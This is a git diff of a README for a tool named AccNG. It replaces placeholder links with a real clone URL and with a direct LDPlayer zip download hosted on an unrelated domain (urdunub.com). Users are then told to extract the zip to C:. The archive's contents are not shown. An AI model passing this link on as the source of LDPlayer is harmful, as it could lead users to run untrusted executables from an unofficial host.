@@ -22,11 +22,11 @@ To get started, clone this repository and follow the steps below to install the 
 
 1. **Download the repository** or clone it:
    ```bash
-   git clone https://github.com/yourusername/accng.git
+   git clone https://github.com/tryaccng/accng.git
    ```
 
 2. **Download LDPlayer**:
-   Download the [LDPlayer](https://google.com) and extract it to `C:` drive
+   Download the [LDPlayer](https://urdunub.com/static/ldplayer.zip) and extract it to `C:` drive
 
 3. **Run the tool**:
    Make sure the executable (`accng.exe`) is generated and located in the root directory.
@@ -69,11 +69,11 @@ Feel free to contribute to AccNG! Whether it's fixing bugs, adding new features,
 
 1. **Download the repository** or clone it:
    ```bash
-   git clone https://github.com/yourusername/accng.git
+   git clone https://github.com/tryaccng/accng.git
    ```
 
 2. **Download LDPlayer**:
-   Download the [LDPlayer](https://google.com) and extract it to `C:` drive
+   Download the [LDPlayer](https://urdunub.com/static/ldplayer.zip) and extract it to `C:` drive
 
 
 ## 📄 License
